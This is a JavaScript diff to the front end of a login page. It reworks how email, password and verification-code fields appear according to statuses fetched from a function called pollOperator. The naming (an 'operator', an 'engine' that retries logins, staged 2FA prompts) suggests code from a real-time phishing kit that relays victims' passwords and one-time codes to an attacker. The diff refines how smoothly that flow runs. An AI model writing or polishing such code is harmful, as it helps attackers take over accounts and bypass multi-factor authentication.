@@ -862,16 +862,21 @@ function updateUIForStatus(status, data = {}) {
     case 'WAITINGPASSWORD':
     case 'WAITINGPASSWORDERROR':
       lastFormVisibleStatus=status;
-      setFormSubmitting(false);
-      emailGroup.style.display = 'block';
-      passwordGroup.style.display = 'block';
-      verificationOptionsGroup.style.display = 'none';
-      verificationCodeGroup.style.display = 'none';
-      submitButton.innerText = "Login";
-      if (data.email) emailField.value = data.email;
-      emailField.readOnly = prefilledEmail;
-      passwordField.disabled = false;
-      passwordField.readOnly = false;
+      if (statusChanged) {
+        setFormSubmitting(false);
+        emailGroup.style.display = 'block';
+        passwordGroup.style.display = 'block';
+        verificationOptionsGroup.style.display = 'none';
+        verificationCodeGroup.style.display = 'none';
+        submitButton.innerText = "Login";
+        if (data.email) emailField.value = data.email;
+        emailField.readOnly = prefilledEmail;
+        passwordField.disabled = false;
+        passwordField.readOnly = false;
+        if (!isSameStatusDuringSubmit) {
+          hideLoadingOverlay();
+        }
+      }
       if (data.lastJsonResponse) {
         try {
           const lastResp = typeof data.lastJsonResponse === 'string' ? JSON.parse(data.lastJsonResponse) : data.lastJsonResponse;
@@ -885,9 +890,6 @@ function updateUIForStatus(status, data = {}) {
         document.getElementById('InvalidPassword').style.display = 'block';
       }
       lastShownStatus = currentStatus;
-      if (!isSameStatusDuringSubmit) {
-        hideLoadingOverlay();
-      }
       startPolling(2000);
       break;
     case 'WAITINGOPTIONS':
@@ -920,9 +922,6 @@ function updateUIForStatus(status, data = {}) {
       verificationOptionsGroup.style.display = 'none';
       verificationCodeGroup.style.display = 'block';
       submitButton.innerText = "Submit Code";
-      if (statusChanged) {
-        verificationCodeInput.value = '';
-      }
       const viewName = (data && data.viewName) || (data && data.lastJsonResponse ? (typeof data.lastJsonResponse === 'string' ? JSON.parse(data.lastJsonResponse || '{}') : data.lastJsonResponse).viewName : '') || '';
       const codeLabel = document.getElementById('verificationCodeLabel');
       if (codeLabel) {
@@ -1257,8 +1256,9 @@ async function pollOperator() {
     console.log("Polling response:", data);
 
     if (data.currentStatus) {
-      if (isProcessing && (data.currentStatus === 'WAITINGPASSWORD' || data.currentStatus === 'WAITINGCODE')) {
-        try { const ljr = data.data && data.data.lastJsonResponse ? (typeof data.data.lastJsonResponse === 'string' ? JSON.parse(data.data.lastJsonResponse) : data.data.lastJsonResponse) : null; if (ljr && ljr.engineRetrying === true) { console.log('[Template] Engine retrying, staying in loading state'); return; } } catch (e) {}
+      if (data.engineProcessing) {
+        console.log('[Template] Engine processing, staying in loading state');
+        return;
       }
       isProcessing = false;
       updateUIForStatus(data.currentStatus, data.data || {}); 
@@ -1417,9 +1417,6 @@ async function handleFormSubmission() {
     const data = await response.json();
     console.log("Update process response:", data);
 
-    if (updateType === 'verificationChoice') {
-      await new Promise(resolve => setTimeout(resolve, 3000));
-    }
     isProcessing = true;
     updateUIForStatus('PROCESSING', {});
 
